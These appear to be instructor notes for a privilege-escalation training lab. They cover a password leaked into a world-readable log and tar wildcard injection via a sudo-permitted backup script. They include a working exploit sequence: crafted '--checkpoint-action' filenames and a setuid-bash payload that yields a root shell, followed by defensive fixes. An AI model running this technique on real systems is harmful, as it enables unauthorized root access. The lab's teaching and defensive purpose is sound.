# Privilege escalation: instructor notes (Stage 10-14)

**Do not link this file from student-facing pages.** It is intended for
instructors verifying the lab and for a post-exercise debrief.

## The misconfiguration (two hops, no group membership involved in either)

Provisioned by `setup_privesc.sh` (run at container build time and by
`scripts/reset_lab.sh`):

### Hop 1 — `appuser` (low) -> `opsuser` (mid): misplaced credential

- `opsuser` is a normal account, generated a random password at
  provisioning time.
- That password is pasted into `/opt/shop/logs/provisioning.log`, owned
  `root:root`, mode `644` -- **world-readable**. This is the same
  "secret got logged/pasted somewhere it never should have been" mistake
  the lab also teaches at the database layer (see `database/seed.py`'s
  `INC-10485` ticket, which does the same thing to the site admin's app
  password).
- `appuser` (the account the vulnerable image-upload chain executes code
  as, Stage 9) can simply read the log and `su opsuser`.

### Hop 2 — `opsuser` (mid) -> root (high): tar wildcard/argument injection

- `/opt/shop/scripts/backup.sh` is owned `root:root`, mode `750` --
  **not** writable by `opsuser` or anyone but root. (This is the
  explicit fix for the *old* version of this lab's bug -- editing the
  script directly is a dead end now.)
- `/etc/sudoers.d/shop-ops` grants `opsuser ALL=(root) NOPASSWD:
  /opt/shop/scripts/backup.sh` -- scoped to exactly that one script, not
  `ALL=(ALL) NOPASSWD:ALL`.
- The bug lives inside the script instead: it `cd`s into
  `/opt/shop/backups/staging/` (owned `opsuser:opsuser`, mode `700` --
  writable by `opsuser` and nobody else) and runs `tar -czf <dest> *`.
  Because the *shell*, not `tar`, expands that glob, `opsuser` can plant
  filenames in the staging directory that `tar`'s own argument parser
  will interpret as flags rather than file names -- the classic
  GTFOBins `tar` wildcard-injection technique.

## Expected student path

**Hop 1**, from an `appuser` shell (after Stage 9):
1. `id` -- an ordinary, unprivileged account; no interesting group
   membership, `sudo -l` shows nothing at all.
2. Enumerate world-readable files, e.g. `grep -ri password
   /opt/shop/logs/*` -- finds `provisioning.log` with `opsuser`'s
   plaintext password.
3. `su opsuser` (enter the leaked password).

**Hop 2**, from the new `opsuser` shell:
4. `sudo -l` -- shows the scoped NOPASSWD rule for `backup.sh`.
5. `ls -la /opt/shop/scripts/backup.sh` -- `root:root`, mode `750`, not
   writable. Trying to edit it directly (the old technique) fails.
6. `ls -la /opt/shop/backups/staging/` and read `backup.sh` (world-
   readable, just not writable) -- realize the script tars that exact
   directory with a bare `*` glob, and the directory is opsuser-owned.
7. Plant the classic GTFOBins tar checkpoint payload:
   ```bash
   cd /opt/shop/backups/staging
   echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' > payload.sh
   touch -- '--checkpoint=1'
   touch -- '--checkpoint-action=exec=sh payload.sh'
   sudo /opt/shop/scripts/backup.sh
   /tmp/rootbash -p
   ```
8. Read `/root/final_flag`. (`/opt/shop/flags/stage2`, readable only by
   `opsuser`, proves the Hop 1 -> Hop 2 transition specifically, in case
   an instructor wants to award partial credit.)

## Why this is a good training vulnerability

- Deterministic and 100% reproducible after `reset_lab.sh` -- no reliance
  on a kernel version or unpatched CVE, and both hops use fresh random
  values each reset (not fixed guessable constants).
- Two genuinely different bug classes stacked, not one bug repeated:
  credential hygiene (secrets pasted into logs) for Hop 1, and unsafe
  handling of a wildcard glob inside a privileged script for Hop 2 -- a
  well-known real-world technique (see GTFOBins' `tar` entry), not
  invented for this lab.
- Not `ALL=(ALL) NOPASSWD:ALL` -- the sudo rule is narrowly scoped, which
  is exactly why the deeper bug (unsafe glob handling) needs to be found:
  scoped sudo rules are NOT automatically safe just because the target
  script itself can't be edited.
- No account here shares a Unix group with another for privilege
  purposes -- each hop is its own distinct credential/authorization
  boundary, which is more representative of how a real host with
  several service accounts is actually laid out.

## Defensive fix

- Never write secrets (passwords, tokens, keys) into log files, even
  "temporarily" or "for debugging" -- treat any provisioning/deploy log
  as something that will eventually be read by someone who shouldn't
  have the values in it.
- Any script invoked via `sudo` that operates on a directory writable by
  the account permitted to invoke it must never pass an unquoted/glob
  argument straight to a program like `tar`, `chown`, `rsync`, or `chmod`
  that treats certain argument patterns specially -- use `--` to end
  option parsing, enumerate files explicitly, or run such tools with
  `--no-unknown-keyword` equivalents where available.
- Prefer a dedicated backup service account with no interactive login
  and no sudo rights of its own, triggered by a systemd timer instead of
  a human/application-invoked sudo rule.
